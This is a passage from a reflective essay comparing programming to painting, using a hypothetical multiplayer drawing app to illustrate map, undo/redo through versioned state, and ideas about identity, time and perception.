      y = center.y + radius * sin(degrees)
      into(pixels, [x, y])
    pixels

\[/code\]

We can write it like this, but what's *really* going on here?

If you think about it, we're *transforming* one list (of degrees) to
another list (of pixels). If we use an analogy in the real world, it
could look like an assembly line:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NjEzMS1iMjU0ZTRkZi0xODczLTQ3MGEtYjJmMy1iYzc1NzU4MWQyNjkucG5n)

Assembly Lines

There's one assembly line with `degrees` and a worker beside it. The
worker picks up each `degrees`, figures out the corresponding pixel, and
adds them to the `pixel` assembly line.

It took a sentence to explain, but it's a valuable concept, and we can
generalize it. What if we called this `map` ? A worker "maps" `degrees`
to `pixels`. Here's how how our program could look now:

\[code\]

    def draw_circle(center, radius):
      map [0..360]: 
        degrees =>
        [center.x + radius * cos(degrees), center.y + radius * sin(degrees)]

\[/code\]

Now whenever we see `map`, the assembly line idea pops into our head.
Not only does it give us a shorthand, but it opens up a new world; what
*else* goes on in assembly lines, and can we use those concepts to help
us think better? \[12\]

### Logic

Just with circles, we were forced to invent snippets and map. Imagine
all that we'd discover if we kept going: what about shadows? what about
layers?

The computer can only understand precise instructions, and there are
only so many precise instructions we can keep in our heads. The more
complicated the programs we write, the more we're forced to invent new
concepts. From there comes the programmer's first insight: *they learn
what helps humans think better.*

Already we hit an interesting philosophical plane. When you learn what
helps humans think better, you're bound to ask *why.* But it gets
grander.

## Reality, II

Now as we progress on with pixel.fyi, we'd want to support "undo" and
"redo". If a painter drew a smiley and didn't like the nose, they should
be able to "undo" it:

### Undo / Redo

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NjE3Ny1iMDc2MTkzZC1mZDE3LTQ1NmYtOGUzMy0wMzI5OWEzZTNmYTYucG5n)

Scratch the nose

How could we support this? If we just `turn_on(draw_circle(...))` all
over the place, there's no way for us to know what the last instruction
would be. It's time for us to look for a new concept.

### Time

Here's a new idea. What if we kept track of the painting over *time*?
Something like this:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NjIwNC1kYzhhZGY1NS03MjAyLTQ1ZTgtYjU2Ni1kZTY5YzEyY2RiMWIucG5n)

Painting over time

We have a list that represents time. Any change we make creates a new
"version" of the painting, and adds it to the list. A painting at a
point in time is just all the pixels that are turned on then.

"Current" points to the version we show our user. When they press "undo"
or "redo", we simply *move* "current" to another version in our list.

In our computer language, it could look something like this:

\[code\]

    painting = [[]]
    current = 0

    def add_circle(center, radius):
      last_version = painting[current]
      new_version = into(last_version, draw_circle(center, radius))
      into(painting, new_version)
      current = current + 1

    def undo(): 
      current = current - 1

    loop: 
      turn_off(all_pixels)
      turn_on(paintings[current]))

\[/code\]

This would support undo / redo, but it also opens up some interesting
questions.

### Identity

First, consider that when we think about a "painting" in real life, we
think about it as the end result. But here, we think about a painting as
*all the versions that existed throughout time.*

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NjI1NC05NTdkY2EwMS03YjZiLTRmMDctOTU5MC04OTUxNzI4YzJhZGUucG5n)

Two views

It's convenient to think this way for undo and redo, but isn't life
*actually* like this? Unfortunately, we are stuck in 3 dimensions and
can\'t travel through time, but if we could, we would see that identity
encompasses time. A painting begun, even if it goes through change after
change, is the same painting in the end. That's the same with people; no
cell in your body existed when you were 5, but you're still you.

### Change

Another interesting idea, how *does* change happen? When we draw, we
think we irrevocably modify the canvas. But if we could travel through
time, we'd see something different: the canvas would *evolve.* After
all, if you add a nose and go back in time, you'd still see the canvas
without the nose, so how could the canvas have been irrevocably modified
*?*

As it turns out, my friend Dennis \[13\] was so intrigued by this idea
that he once explored a 3D animation for it, and it was about painting
to boot. Here's his rendering of a painting that evolves over time:

![](https://stopa.io/api/image/firstFrame/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU3NDQwNy0zMTIwOGNiNy1lYTFjLTRmNmMtOTQ2MS05OTZiZDdhZTUzYjIuZ2lm)

![](https://stopa.io/api/image/firstFrame/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU3NDQ5Ny03NDI4Yjc4ZC05YzExLTRmMTQtOGM2MS1jMGE4MjVhZWY5NTIuZ2lm)

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU3NDU5Mi1iM2Y5ZTlmOC1lZjNjLTQyYWEtODBiNC01ZGMwMWVmYzVkMmIuanBlZw)

So darn interesting. We've lived in four dimensions all along but never
saw it like this.

### Perception

And the insights don't stop. Remember, this is a *multiplayer* drawing
app. Could "Stopa" and "Joe" draw a shape *at the same time?*

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NjMwOC01N2YyZTVhMC0yOWIxLTQ5ZGQtOWUzMi0xNWQxMGQwZWQ5MWQucG5n)

Oops

This couldn't happen when painting in real life; our hands don't move
fast enough. But a computer moves real fast; it's certainly possible
that Joe sees a blue shape and makes it red, but by the time this
completes, Stopa sees the same blue shape and makes it green.

This problem opens an interesting question about how we perceive
*anything* in life! If your friend is in front of you for example, how
do you *see* them?

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NjM0Mi1lNDE2M2FmZi0xOThkLTRlMmYtOTJiYi01MGYwNTg4NTFjM2YucG5n)

Perception

Well, light bounces around the room. Some of it hits your friend and
reflects into your eyes. Your eyes then process the light, which
activates signals in your brain. Those signals in turn activate more
signals, until a thought pops up: "I see my friend".

All of this takes time, right? It *feels* instant, but it takes time for
light to move and for signals to activate in your brain. This means
then, *that everything you see is from the past*!

When you try to solve problems like "Joe and Stopa change the same shape
at the same time", you realize at least computers always see the past.
It's awe- inspiring that our reality works the same. We just experienced
a sliver of the programmer's second insight: *they learn to unravel the
secrets of nature.* \[14\]

## Transcendence, II

As programmers master these insights, they take their work to heights we
couldn't have imagined before. Well, actually we don't know this quite
yet, because we programmers haven't mastered the insights!

### Giotto

If you paralleled the story of programmers with Renaissance painters,
we'd be at the Giotto stage:

![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE2MzU4NjM4OS00MjhhZWVmMi1hYTQ0LTQ3ODYtOGZmNC02Mjg2ODI3MDY0MzUucG5n)

Kiss of Judas, Giotto

Giotto was early. Before him, most painters followed strict rules and
their work was flat. He questioned assumptions, began to study nature,
and made giant leaps in his lifetime \[15\]. Though his own work was
still crude, in only a few generations Michelangelo would step on the
scene.

That's where the best programmers are today. Our work is crude, but
we're questioning assumptions and constantly looking for inspiration
from nature. It's so early that some of the best ideas are prime
picking, and the state of the art evolves every year. We can already see
astonishing results at the edges, like computers transcribing human
speech with better accuracy or self- driving cars whizzing around roads.

### Progress

We're left in an exciting state. I'm curious to know what transcendence
will look like in our field. Computers are faster than any natural organ
in our body. They need no sleep, can work 24/7, can "distribute" their
brains around the world, and run for millennia. What kind of surprises
lie ahead for us? What kind of concepts will the Michelangelo
programmers of the future be using?

These insights touch on what makes programming *art.* Programming isn't
a rote exercise, but an inquiry into reality and perception.

------------------------------------------------------------------------

## Art

Wow, what a journey we just went on.

### Painters and Programmers

We learned that the brush forces the painter to notice details that we'd
ignore. The painter's goal is to affect us, and successive paintings
help them unravel our subconscious drivers. Invariably they discover
secrets of nature, and eventually transcend it.

Similarly, the computer language forces the programmer to notice details
that we'd ignore. Their goal is to solve hard problems, and successive
solutions help them unravel tools for human thought. Invariably they
discover secrets of nature, and eventually transcend it.

### Writers and Creators

It strikes me, that perhaps all creative pursuits are like this. This
essay was born from a conversation, where I tried to explain why I found
programming so invigorating. I thought I'd start with painting as the
metaphor. However, putting words to paper had me discovering details I
had ignored. I was plunged into book after book on art and even expanded
my thinking on programming. \[16\]

There's an obvious utility to the output of creation, but even if there
wasn't, I think there would be an overwhelming reason to do it anyway,
just for the insights you get. \[17\]

I hope this got you thrilled about the beauty of making things.

## Credits

Ernst Gombrich's "Story of Art" influenced how I saw art throughout the
ages. PG is a hero of mine, and his essays on hacking and painting
continue to inspire me \[18\]. I am taken by Rich Hickey's model for
programming. His motivations for Clojure largely inspired the "Reality,
II" section. \[19\]

*Thanks to Joe Averbukh, Daniel Woelfel, Nicole Garcia Fischer, Mark
Shlick, Lina Wang, Dennis Heihoff, Alex Reichert, Julien Odent, Irakli
Popkhadze, Simon Chaffetz, Jacky Wang, Nino Parunashvili, Marek Golias
for reviewing drafts of this essay*
